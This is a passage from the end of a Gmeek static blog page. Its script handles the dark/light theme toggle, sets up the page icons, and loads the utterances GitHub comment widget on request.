7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
var utterancesLoad=0;

let themeSettings={
    "dark": ["dark","moon","#00f0ff","dark-blue"],
    "light": ["light","sun","#ff5000","github-light"],
    "auto": ["auto","sync","","preferred-color-scheme"]
};
function changeTheme(mode, icon, color, utheme){
    document.documentElement.setAttribute("data-color-mode",mode);
    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
    document.getElementById("themeSwitch").parentNode.style.color=color;
    if(utterancesLoad==1){utterancesTheme(utheme);}
}
function modeSwitch(){
    let currentMode=document.documentElement.getAttribute('data-color-mode');
    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
    localStorage.setItem("meek_theme", newMode);
    if(themeSettings[newMode]){
        changeTheme(...themeSettings[newMode]);
    }
}
function utterancesTheme(theme){
    const message={type:'set-theme',theme: theme};
    const iframe=document.getElementsByClassName('utterances-frame')[0];
    iframe.contentWindow.postMessage(message,'https://utteranc.es');
}
if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n\n","padding:5px 0;background:#02d81d;color:#fff");
</script>

<script>
document.getElementById("pathHome").setAttribute("d",IconList["home"]);
document.getElementById("pathIssue").setAttribute("d",IconList["github"]);

function openComments(){
    cm=document.getElementById("comments");
    cmButton=document.getElementById("cmButton");
    cmButton.innerHTML="loading";
    span=document.createElement("span");
    span.setAttribute("class","AnimatedEllipsis");
    cmButton.appendChild(span);

    script=document.createElement("script");
    script.setAttribute("src","https://utteranc.es/client.js");
    script.setAttribute("repo","zckevin/blog");
    script.setAttribute("issue-term","title");
    
    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
    else{script.setAttribute("theme","preferred-color-scheme");}
    
    script.setAttribute("crossorigin","anonymous");
    script.setAttribute("async","");
    cm.appendChild(script);

    int=self.setInterval("iFrameLoading()",200);
}

function iFrameLoading(){
    var utterances=document.getElementsByClassName('utterances');
    if(utterances.length==1){
        if(utterances[0].style.height!=""){
            utterancesLoad=1;
            int=window.clearInterval(int);
            document.getElementById("cmButton").style.display="none";
            console.log("utterances Load OK");
        }
    }
}
</script>



</html>
